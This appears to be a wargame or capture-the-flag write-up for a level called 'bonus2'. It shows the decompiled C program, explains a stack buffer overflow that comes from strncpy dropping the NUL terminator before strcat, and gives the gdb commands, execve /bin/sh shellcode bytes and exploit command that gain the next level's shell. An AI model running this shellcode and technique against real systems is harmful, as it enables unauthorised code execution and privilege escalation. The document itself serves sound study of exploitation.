bonus2
======

Decompilation
-------------

The program looks like this:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>

#define LANG_FI "fi"
#define LANG_NL "nl"

#define S_GREETING_EN "Hello "
#define S_GREETING_FI "Hyv\xC3\xA4\xC3\xA4 p\xC3\xA4iv\xC3\xA4\xC3\xA4 "
#define S_GREETING_NL "Goedemiddag! "

enum lang_id
{
    LANG_ID_EN,
    LANG_ID_FI,
    LANG_ID_NL,
};

static enum lang_id    language;

int greetuser(char *message)
{
  char greeting [72];

  if (language == LANG_ID_FI)
    strcpy(greeting, S_GREETING_FI);
  else if (language == LANG_ID_NL)
    strcpy(greeting, S_GREETING_NL);
  else if (language == LANG_ID_EN)
    strcpy(greeting, S_GREETING_EN);

  strcat(greeting, message);

  return puts(greeting);
}


int main(int ac, char **av)
{
  int ret;
  char message [76];
  char *lang;

  if (ac == 3)
  {
    bzero(message, sizeof(message));

    strncpy(message, av[1], 40);
    strncpy(message + 40, av[2], 32);

    lang = getenv("LANG");

    if (lang != NULL)
    {
      ret = memcmp(lang, LANG_FI, sizeof(LANG_FI) - 1);

      if (ret == 0)
        language = LANG_ID_FI;
      else
      {
        ret = memcmp(lang, LANG_NL, sizeof(LANG_NL) - 1);

        if (ret == 0)
          language = LANG_ID_NL;
      }
    }
    ret = greetuser(message);
  }
  else
    ret = 1;
  return ret;
}
```

The main takes two arguments and stores them consecutively into a stack buffer.
Afterwards, it checks the `LANG` variable to determine the language in which to greet the user.
The buffer is then passed to the greetuser function, which will concatenate the greeting and the buffer into a separate stack buffer.
Finally, the message is printed to standard output using puts.

Exploitation
------------

If we manage to overflow the message buffer we can override greetuser's return pointer.
We can exploit strncpy again, because it does not guarantee NUL-termination.
This enables the greetuser's strcat to read the consecutive arguments without encountering the of the string.
Using the `LANG` variable, we can select the longest greeting to fill the beginning of the buffer.

```
buffer_len = 72
arg1_len = 40
greeting_len = 18

arg2_len = buffer_len - arg1_len - greeting_len + 4 = 18
```

The buffer is 72 bytes long, which means that we need to input 40 bytes into the first, and 18 into the second argument to reach the return pointer.

We can determine the address of the destination buffer using gdb, put some shellcode at the beginning and overflow with the buffer's address, to return onto it.

To prevent issues with the environment size interfering with stack addresses, we can use the env utility with the -i option.

```sh
gdb -batch -ex 'set exec-wrapper env -i LANG=fi' -ex 'b * 0x8048522' -ex "r $(printf '%.0sA' {1..40}) $(printf '%.0sB' {1..18})CCCC" -ex 'p (char*) $eax + 18' ./bonus2
```
```
...
Breakpoint 1, 0x08048522 in greetuser ()
$1 = 0xbffffd12 'A' <repeats 40 times>, 'B' <repeats 18 times>, "CCCC"
```

We can now input our shellcode:
```sh
SHELLCODE=$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

env -i LANG=fi ~/bonus2 "$SHELLCODE$(printf '%.0sA' {1..19})" "$(printf '%.0sB' {1..18})"$'\x12\xfd\xff\xbf' <<< whoami
```
```
Hyvää päivää 1É÷á°
                  Qh//shh/binã̀AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBýÿ¿
bonus3
```
